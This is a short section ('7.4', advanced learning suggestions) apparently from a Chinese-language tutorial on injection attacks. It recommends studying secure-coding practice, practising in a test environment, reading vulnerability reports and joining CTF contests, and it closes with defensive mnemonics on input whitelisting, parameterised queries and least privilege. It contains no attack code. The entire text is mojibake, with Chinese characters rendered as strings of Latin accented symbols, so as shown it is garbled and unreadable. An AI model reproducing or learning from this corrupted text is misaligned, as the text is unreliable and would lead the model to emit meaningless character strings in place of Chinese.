### 7.4 è¿›é˜¶å­¦ä¹ å»ºè®®


**ğŸ“š çŸ¥è¯†æ‰©å±•**
- æ·±å…¥å­¦ä¹ å„ç§ç¼–ç¨‹è¯­è¨€çš„å®‰å…¨ç‰¹æ€§
- äº†è§£ä¸åŒæ¡†æ¶çš„å®‰å…¨æœºåˆ¶
- å­¦ä¹ å®‰å…¨ç¼–ç è§„èŒƒå’Œæœ€ä½³å®è·µ
- å…³æ³¨æœ€æ–°çš„æ³¨å…¥æ”»å‡»æŠ€æœ¯å’Œé˜²æŠ¤æ–¹æ³•

**ğŸ› ï¸ å®è·µå»ºè®®**
- æ­å»ºæµ‹è¯•ç¯å¢ƒç»ƒä¹ å„ç§æ³¨å…¥æ”»å‡»
- é˜…è¯»çœŸå®æ¼æ´æ¡ˆä¾‹å’Œåˆ†ææŠ¥å‘Š
- å‚ä¸CTFç«èµ›æå‡å®æˆ˜èƒ½åŠ›
- å®šæœŸæ›´æ–°å®‰å…¨çŸ¥è¯†å’Œå·¥å…·

**æ ¸å¿ƒè®°å¿†å£è¯€**ï¼š
- æ³¨å…¥æ”»å‡»æ··æ•°æ®ï¼ŒæŒ‡ä»¤æ‰§è¡Œè¦å½“å¿ƒ
- éªŒè¯è¾“å…¥ç”¨ç™½åï¼Œå‚æ•°æŸ¥è¯¢ä¿å®‰å…¨
- æƒé™æœ€å°åŠŸèƒ½åˆ†ï¼Œç›‘æ§æ—¥å¿—é˜²æœªç„¶
- ç†è®ºå®è·µä¸¤æ‰‹æŠ“ï¼Œå®‰å…¨é˜²æŠ¤æ­¥æ­¥è¡Œ